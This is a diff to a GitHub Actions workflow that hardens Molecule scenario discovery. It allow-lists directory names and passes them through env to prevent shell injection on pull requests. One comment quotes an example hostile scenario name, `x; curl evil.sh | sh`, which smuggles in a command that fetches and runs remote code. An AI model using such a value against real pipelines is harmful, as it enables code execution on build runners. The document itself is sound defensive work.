@@ -64,17 +64,24 @@ jobs:
         run: |
           set -euo pipefail
           # A scenario is a directory under molecule/ containing molecule.yml.
+          # -printf '%h' gives the directory; sed takes the basename. Avoids
+          # piping find output through xargs, which mishandles odd filenames.
           names=$(
             find molecule -mindepth 2 -maxdepth 2 -name molecule.yml \
-              -exec dirname {} \; | xargs -n1 basename | sort
+              -printf '%h\n' | sed 's#.*/##' | sort
           )
 
           # Allow-list the names before they can reach a matrix value. This
           # workflow runs on pull_request, so a directory name is attacker-
           # controlled input: a scenario called `x; curl evil.sh | sh` would
-          # otherwise be interpolated straight into a shell. Names are also
-          # passed via env rather than `${{ }}` in the run step below — both
-          # controls, not either.
+          # otherwise be interpolated straight into a shell. The run step below
+          # additionally takes the name through env rather than GitHub
+          # expression interpolation — both controls, not either.
+          #
+          # NB: do not write a literal GitHub expression anywhere in a run
+          # block, including in a shell comment. The runner substitutes them
+          # before bash ever sees the script, so an empty one is a workflow
+          # parse error that fails the whole file at startup with no job logs.
           if bad=$(grep -vE '^[a-z0-9_]+$' <<<"$names"); [ -n "$bad" ]; then
             echo "::error::Rejected molecule scenario name(s) outside [a-z0-9_]: $bad"
             exit 1
@@ -126,11 +133,10 @@ jobs:
 
       # molecule/default/verify.yml imports tests/container_start_contract.yml,
       # so the `default` scenario also carries the container start contract.
-      #
-      # SCENARIO goes through env, not `${{ }}` interpolation into the shell.
-      # The value is a repository directory name and this workflow now runs on
-      # pull_request, so it is untrusted input; `discover` additionally
-      # allow-lists it to [a-z0-9_].
+      # SCENARIO reaches the script through env, not through GitHub expression
+      # interpolation into the shell. The value is a repository directory name
+      # and this workflow now runs on pull_request, so it is untrusted input;
+      # `discover` additionally allow-lists it to [a-z0-9_].
       - name: Run the ${{ matrix.scenario }} molecule scenario
         run: molecule test -s "$SCENARIO"
         env:
